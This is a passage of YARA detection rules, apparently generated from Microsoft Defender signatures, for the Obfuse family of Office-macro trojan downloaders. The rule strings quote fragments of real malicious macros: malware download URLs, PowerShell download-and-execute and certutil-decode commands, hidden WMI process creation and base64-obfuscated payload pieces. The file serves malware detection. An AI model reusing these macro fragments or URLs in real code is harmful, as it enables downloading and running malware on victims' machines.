        $x_1_2 = {43 72 65 61 74 65 28 [0-8] 2c 20 4e 75 6c 6c 2c 20 4e 75 6c 6c 2c 20 69 6e 74 50 72 6f 63 65 73 73 49 44 29}  //weight: 1, accuracy: Low
        $x_1_3 = "http://primetour.net.br/v.txt" ascii //weight: 1
        $x_1_4 = "start-process($env:APPDATA+'\\\\'+'file.vbs')" ascii //weight: 1
        $x_1_5 = {4d 69 64 28 22 [0-32] 22 2c 20 31 2c 20 31 31 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAU_2147768092_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAU!MTB"
        threat_id = "2147768092"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {53 01 00 00 68 01 00 00 65 01 00 00 6c 01 00 00 45 01 00 00 78 01 00 00 63 01 00 00 75 01 00 00 74 01 00 00 41 03}  //weight: 1, accuracy: High
        $x_1_2 = "https://googleresult.in/ds/151120.gif" ascii //weight: 1
        $x_1_3 = "http://cloud.c-tes.gr/ds/151120.gif" ascii //weight: 1
        $x_1_4 = "https://maharishijeevan.com/ds/151120.gif" ascii //weight: 1
        $x_1_5 = "https://19racks.com.br/ds/151120.gif" ascii //weight: 1
        $x_1_6 = "http://new.odingrad.com/ds/151120.gif" ascii //weight: 1
        $x_1_7 = "https://camexsuriname.sr/ds/151120.gif" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_JAV_2147768473_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.JAV!MTB"
        threat_id = "2147768473"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Path & \"\\W0rd.dll\") = \"\"" ascii //weight: 1
        $x_1_2 = "ShellExecute(fa & \"nd\" & \"ll\" & \"32.exe" ascii //weight: 1
        $x_1_3 = "W0rd.dll,Start\", \" \", SW_SHOWNORMAL" ascii //weight: 1
        $x_1_4 = "ya.wav\" As ActiveDocument.AttachedTemplate.Path & \"\\W0rd.dll\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAH_2147768557_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAH!MTB"
        threat_id = "2147768557"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = {65 78 65 63 20 3d 20 [0-6] 70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 [0-6] 49 45 58 20 [0-4] 6e 65 77 2d 6f 62 6a 65 63 74 20 6e 65 74 2e 77 65 62 63 6c 69 65 6e 74 [0-4] 2e 64 6f 77 6e 6c 6f 61 64 73 74 72 69 6e 67 28 27 68 74 74 70 3a 2f 2f [0-4] 2e [0-4] 2e [0-4] 2e [0-4] 2f 70 61 79 6c 6f 61 64 2e 74 78 74 20 27 [0-4] 22 22 22}  //weight: 1, accuracy: Low
        $x_1_3 = "Shell (exec)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAM_2147768558_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAM!MTB"
        threat_id = "2147768558"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 45 6e 76 69 72 6f 6e 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= Split(\"mshta.exe|in.com|in.html\", \"|\")" ascii //weight: 1
        $x_1_3 = {28 22 77 69 6e 22 20 26 20 22 64 69 72 22 29 20 26 20 [0-16] 20 26 20 22 73 79 73 74 65 22 20 26 20 22 6d 33 32 22 20 26 20 [0-16] 20 26 20 [0-16] 28 30 29}  //weight: 1, accuracy: Low
        $x_1_4 = {28 22 74 65 22 20 26 20 22 6d 70 22 29 20 26 20 [0-16] 20 26 20 [0-16] 28 31 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LN_2147768928_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LN!MTB"
        threat_id = "2147768928"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"w\" & Replace(\"wsconroniponton /bon /one" ascii //weight: 1
        $x_1_2 = "= \"c:\\Users\\Public\" & Empty & \"\\Documents\\\" & \"info.txt\" & Empty" ascii //weight: 1
        $x_1_3 = "Sub MakeWebQuery()" ascii //weight: 1
        $x_1_4 = "ll = \"htt\"" ascii //weight: 1
        $x_1_5 = "ll = ll & \"ps:\"" ascii //weight: 1
        $x_1_6 = "ll = ll & \"//sherpa\"" ascii //weight: 1
        $x_1_7 = "ll = ll & \".casa/wp-\" & Empty & Empty & \"\" & \"info.p\"" ascii //weight: 1
        $x_1_8 = "ll = ll & \"hp\"" ascii //weight: 1
        $x_1_9 = "Set shFirstQtr" ascii //weight: 1
        $x_1_10 = "URL;\" & ll, Destination:= _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAO_2147769318_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAO!MTB"
        threat_id = "2147769318"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "https://via.hypothes.is/boyama.medyanef.com/vendor/hamcrest/files/phy__1__31629__2649094674__1605642612.exe" ascii //weight: 1
        $x_1_2 = {73 74 61 72 74 20 [0-16] 25 54 4d 50 25 5c 31 30 30 72 6e 2e 65 78 65 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CRV_2147769475_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CRV!MTB"
        threat_id = "2147769475"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Range(\"A1:J15\").Select" ascii //weight: 1
        $x_1_2 = "Set njhbwchqy  = CreateObject(Range(\"A4\").Value)" ascii //weight: 1
        $x_1_3 = "ukbdrdezimnisjmetvjhzgidfopjubwcrep = Range(\"A3\").Value" ascii //weight: 1
        $x_1_4 = "Range(\"M5\").Select" ascii //weight: 1
        $x_1_5 = "polaothia = njhbwchqy.Create(ukbdrdezimnisjmetvjhzgidfopjubwcrep)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CRV_2147769475_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CRV!MTB"
        threat_id = "2147769475"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 49 6d 61 67 65 6d 53 69 6d 70 6c 65 73 43 44 54 2c 20 4d 61 73 74 65 72 43 44 54 20 26 20 22 64 6f 63 75 6d 65 6e 74 2e [0-3] 22 2c 20 30 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_2 = "Shell (M_S + TOGACDT + M_S1 + M_S2 + M_S3), 0" ascii //weight: 1
        $x_1_3 = "PDf_2 = \"exe\"\" /c pi\"" ascii //weight: 1
        $x_1_4 = "MasterCDT = \"C:\\Users\\Public\\\"" ascii //weight: 1
        $x_1_5 = "= \"> nul & start C\"" ascii //weight: 1
        $x_1_6 = "RaboDeCavalo = \":\\Users\\Public\\document.\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_CTH_2147769482_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.CTH!MTB"
        threat_id = "2147769482"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Public Sub BHdHllL()" ascii //weight: 1
        $x_1_2 = "bbb = Left(\"0jh9876543567987654345678654323546675435\", 1)" ascii //weight: 1
        $x_1_3 = "cur(iC) = ActiveCell.Offset(iC, 1).Value" ascii //weight: 1
        $x_1_4 = "x = Replace(x, \"zzciosojyoclql\", \"\")" ascii //weight: 1
        $x_1_5 = "Call n7654" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RNG_2147769569_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RNG!MTB"
        threat_id = "2147769569"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Range(\"A1:J15\").Select" ascii //weight: 1
        $x_1_2 = "Range(\"l1:x22\").Select" ascii //weight: 1
        $x_1_3 = "cwjkvfbumsgmjipsbdalpasrawstzlmwpcn = Range(\"A3\").Value" ascii //weight: 1
        $x_1_4 = "Set inbykwmcp  = CreateObject(Range(\"A4\").Value)" ascii //weight: 1
        $x_1_5 = "bntngqrpw = inbykwmcp.Create(cwjkvfbumsgmjipsbdalpasrawstzlmwpcn)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RSM_2147769614_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RSM!MTB"
        threat_id = "2147769614"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Range(\"A1:J15\").Select" ascii //weight: 1
        $x_1_2 = "tadlbntqflqtbtpeeoidjzjdnnxdshabjjq = Range(\"A3\").Value" ascii //weight: 1
        $x_1_3 = "qjbtnnpfd  = CreateObject(Range(\"A4\").Value)" ascii //weight: 1
        $x_1_4 = "qjbtnnpfd.Create(tadlbntqflqtbtpeeoidjzjdnnxdshabjjq)" ascii //weight: 1
        $x_1_5 = "Range(\"M5\").Select" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RSM_2147769614_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RSM!MTB"
        threat_id = "2147769614"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Range(\"A1:J18\").Select" ascii //weight: 1
        $x_1_2 = "opslmgtrdsvukodbnjoxctigznkfrbedwlrtfkzxciisufoslmrkbowuhlmyvnzcnryzwjw  = CreateObject(Range(\"A123\").Value)" ascii //weight: 1
        $x_1_3 = "myvnzcnryzwjw.Create(soglbjxwbectbcnooheat" ascii //weight: 1
        $x_1_4 = "Range(\"M5\").Select" ascii //weight: 1
        $x_1_5 = "jqkzxoxkqocuumzjusscftxzmrvfgytikfjxwlevzmkqzzhpofuply = Range(\"A17\").Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_GS_2147769711_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.GS!MTB"
        threat_id = "2147769711"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "DownloadAndExec" ascii //weight: 1
        $x_1_2 = {77 69 6e 64 6f 77 73 5c 74 65 6d 70 5c 65 6e 63 6f 64 65 64 2e 63 72 74 22 2a 00 2e 73 61 76 65 74 6f 66 69 6c 65 20 22 43 3a 5c}  //weight: 1, accuracy: Low
        $x_1_3 = {73 69 74 69 61 69 73 61 69 63 6f 6c 2d 65 6e 76 2e 65 62 61 2d 63 77 75 32 77 6a 32 7a 2e 75 73 2d 65 61 73 74 2d 31 2e 65 6c 61 73 74 69 63 62 65 61 6e 73 74 61 6c 6b 2e 63 6f 6d 2f 61 64 6d 69 6e 2f 67 65 74 2e 70 68 70 51 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_4 = "Shell (\"cmd /c certutil -decode" ascii //weight: 1
        $x_1_5 = {77 69 6e 64 6f 77 73 5c 74 65 6d 70 5c 65 6e 63 6f 64 65 64 2e 65 78 65 21 00 73 74 61 72 74 20 43 3a 5c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_TR_2147769718_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.TR!MTB"
        threat_id = "2147769718"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\PROGRAMDATA\\a\"\"&CHAR(46)&\"\"ex\"\"&CHAR(101)" ascii //weight: 1
        $x_1_2 = "URLDownl\" + aya1 +" ascii //weight: 1
        $x_1_3 = "CHAR(116)&CHAR(116)&CHAR(112)" ascii //weight: 1
        $x_1_4 = "CHAR(58)&CHAR(47)&CHAR(47)" ascii //weight: 1
        $x_1_5 = "CHAR(80)&CHAR(82)&\"\"OGRAMDATA\\a\"\"&CHAR(46)&\"\"ex\"\"&CHAR(101)" ascii //weight: 1
        $x_1_6 = "GOTO(B126),GOTO(C126)" ascii //weight: 1
        $x_1_7 = "ERR\" + \"OR\" + \"(FALSE)\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_TR_2147769718_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.TR!MTB"
        threat_id = "2147769718"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 65 70 6c 61 63 65 28 [0-8] 2c 20 [0-8] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {4d 69 64 28 [0-8] 2c 20 28 ?? ?? ?? ?? ?? 20 2d 20 ?? ?? ?? ?? ?? 29 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_4 = "End Function Function" ascii //weight: 1
        $x_1_5 = "32354 / 32354" ascii //weight: 1
        $x_1_6 = "FileCopy" ascii //weight: 1
        $x_1_7 = {4d 69 64 28 ?? ?? ?? ?? ?? 2c 20 ?? ?? ?? ?? ?? ?? 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_8 = {2e 53 70 6c 69 74 28 ?? ?? ?? ?? ?? 28 22 6c 29 6d 29 74 29 68 29 2e 29 73 29 6d 29 5c 29 63 29 69 29 6c 29 62 29 75 29 70 29 5c 29 73 29 72 29 65 29 73 29 75 29 5c 29 3a 29 43 29 7c 29 6d 29 6f 29 63 29 2e 29 73 29 6d 29 5c 29 63 29 69 29 6c 29 62 29 75 29 70 29 5c 29 73 29 72 29 65 29 73 29 75 29 5c 29 3a 29 43 29 7c 29 65 29 78 29 65 29 2e 29 61 29 74 29 68 29 73 29 6d 29 5c 29 32 29 33 29 6d 29 65 29 74 29 73 29 79 29 73 29 5c 29 73 29 77 29 6f 29 64 29 6e 29 69 29 77 29 5c 29 3a 29 63 29 7c 29 6f 29 74 29 6f 29 6d 29 20 29 6f 29 6c 29 6c 29 65 29 68 29 22 29}  //weight: 1, accuracy: Low
        $x_1_9 = {41 73 63 28 ?? ?? ?? ?? ?? 29}  //weight: 1, accuracy: Low
        $x_1_10 = {49 66 20 28 ?? ?? ?? ?? ?? 20 3e 20 36 34 20 41 6e 64 20 ?? ?? ?? ?? ?? 20 3c 20 39 31 29 20 4f 72 20 28 ?? ?? ?? ?? ?? 20 3e 20 39 36 20 41 6e 64 20 ?? ?? ?? ?? ?? 20 3c 20 31 32 33 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_11 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-8] 29 2e 63 72 65 61 74 65 20 28 [0-8] 29}  //weight: 1, accuracy: Low
        $x_1_12 = {41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 [0-8] 29}  //weight: 1, accuracy: Low
        $x_1_13 = "sse)cor)P_2)3ni)W:2)vmi)c\\t)oor):st)mgm)niw\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (12 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VA_2147769951_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VA!MTB"
        threat_id = "2147769951"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"vdbgd gfdb fsvv + vfder" ascii //weight: 1
        $x_1_2 = "Chr(fr___ee - 69)" ascii //weight: 1
        $x_1_3 = "juy___gt(156) & juy___gt(152) & juy___gt(136) & juy___gt(183) & juy___gt(174) & juy___gt(181) & juy___gt(185) & juy___gt(115) & juy___gt(184) & juy___gt(173) & juy___gt(170) & juy___gt(177) & juy___gt(177)" ascii //weight: 1
        $x_1_4 = ".Run(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VA_2147769951_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VA!MTB"
        threat_id = "2147769951"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "strg = strg & wrd & " ascii //weight: 1
        $x_1_2 = "SDwf = zawgHCVmAwgHCVmAg & c7 & wegjh & uytier & c10 & uytier & ewgHCVmAdthg & c11 & \":\" & zawgHCVmAwgHCVmAg & c7 & wegjh & nFKPbQ(\" 3 2 _\") & nFKPbQ(\" P r o c e s s \")" ascii //weight: 1
        $x_1_3 = "nzFN.Create(MXBTv, Null, Null, intProcessID)" ascii //weight: 1
        $x_1_4 = "nFKPbQ = Replace(wjkwer, \" \", \"\", 1, -1)" ascii //weight: 1
        $x_1_5 = "bolota = b & c & " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VA_2147769951_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VA!MTB"
        threat_id = "2147769951"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "chomputah = \".\"" ascii //weight: 1
        $x_1_2 = "objProcess = GetObject(aabbcc & chomputah & ddeeff & jjkkll)" ascii //weight: 1
        $x_1_3 = "objProcess.Create pr, Null, objConfig, intProcessID" ascii //weight: 1
        $x_1_4 = "pr = ActiveDocument.CustomDocumentProperties(\"prorrete\").Value" ascii //weight: 1
        $x_1_5 = "Set objStartup = objWMIService.Get(gghhii)" ascii //weight: 1
        $x_1_6 = "Set objConfig = objStartup.SpawnInstance" ascii //weight: 1
        $x_1_7 = "objConfig.ShowWindow = HIDDEN_WINDOW" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VA_2147769951_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VA!MTB"
        threat_id = "2147769951"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "trustTemp = Replace(frm.cbtn1.Caption, \"1\", \"\")" ascii //weight: 1
        $x_1_2 = "Set globalLeftSelect = New documentWindow" ascii //weight: 1
        $x_1_3 = "globalLeftSelect.funcStorageTemp trustTemp, titleCaptionDocument" ascii //weight: 1
        $x_1_4 = "VxZXIoZmk7KShkbmVzLkFlY25lcmVmZVJ0c2V1cWVyOyllc2xhZiAsIkhVTWVqc1" ascii //weight: 1
        $x_1_5 = "xDdGhnaXI7KXlkb2Jlc25vcHNlci5BZWNuZXJlZmVSdHNldXFlcihldGlydy50aG" ascii //weight: 1
        $x_1_6 = "VlSFNzREQ2MHlXaEdNeVlielFjRElKdEh2RC8zNjIyNy82NTI0OC9EenVFMVdrSm" ascii //weight: 1
        $x_1_7 = "giICwiVEVHIihuZXBvLkFlY25lcmVmZVJ0c2V1cWVyOykicHR0aGxteC4ybG14c2" ascii //weight: 1
        $x_1_8 = "mV0ZWxlZC5ub3R0dUJ5cmV1cXt5cnQ7KSJ0Y2VqYm9tZXRzeXNlbGlmLmduaXRwa" ascii //weight: 1
        $x_1_9 = "Set leftCaption = CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_10 = "leftCaption.exec Replace(globalLen, \"1\", \"\") & \" \" & Replace(indexTextboxTextbox, \"1\", \"\")" ascii //weight: 1
        $x_1_11 = "Set globalException = requestResponseA.CreateTextFile(iteratorVb)" ascii //weight: 1
        $x_1_12 = "globalException.WriteLine loadLocalQuery" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_VA_2147769951_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.VA!MTB"
        threat_id = "2147769951"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "documentCollectionArray = Replace(frm.cbtn1.Caption, \"1\", \"\")" ascii //weight: 1
        $x_1_2 = "tempRepo.libDocumentLink documentCollectionArray, rightTrustReference" ascii //weight: 1
        $x_1_3 = "Set namespaceRemoveClear = CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_4 = "namespaceRemoveClear.exec Replace(convertLoadDatabase, \"1\", \"\") & \" \" & Replace(procStruct, \"1\", \"\")" ascii //weight: 1
        $x_1_5 = "Set convertClear = memoryPointerDocument.CreateTextFile(valueWindow)" ascii //weight: 1
        $x_1_6 = "convertClear.WriteLine dataView" ascii //weight: 1
        $x_1_7 = "JvdFNiVm5vaXRwb1xcY2lsYnVwXFxzcmVzdVxcOmMiKGVsaWZvdGV2YXMuY251Rm" ascii //weight: 1
        $x_1_8 = "ZlUnRjZWxlczsxID0gZXB5dC5jbnVGZmVSdGNlbGVzO25lcG8uY251RmZlUnRjZW" ascii //weight: 1
        $x_1_9 = "5ldWxhVmV6aVNrbmlsOyllc2xhZiAsIlN1dkRSPWRpcyY5MXZyMERoSGRROEE0Mz" ascii //weight: 1
        $x_1_10 = "dvTGY0Nm5QMXh0UHRacml6ZmNMWXo5Z1BLY2tONC9kZHZkZi9tb2MueXJldmlsZW" ascii //weight: 1
        $x_1_11 = "D0gd2VpVnR4ZVR0eGVuIHJhdjspImdwai5lZ2Fyb3RTYlZub2l0cG9cXGNpbGJ1c" ascii //weight: 1
        $x_1_12 = "tr(\"iteratorDatabase.split('').reverse().join('');}nextProc = window\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RSO_2147770150_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RSO!MTB"
        threat_id = "2147770150"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xHttp.Open \"GET\", \"https://d.top4top.io/p_18010gsks1.jpg\", False" ascii //weight: 1
        $x_1_2 = "savetofile j & \"/client.vbs\", 2" ascii //weight: 1
        $x_1_3 = "Shell \"wscript \" & j & \"/client.vbs\", vbNormalFocus" ascii //weight: 1
        $x_1_4 = "CreateObject(\"Adodb.Stream\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PAP_2147770208_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PAP!MTB"
        threat_id = "2147770208"
        type = "TrojanDownloader"
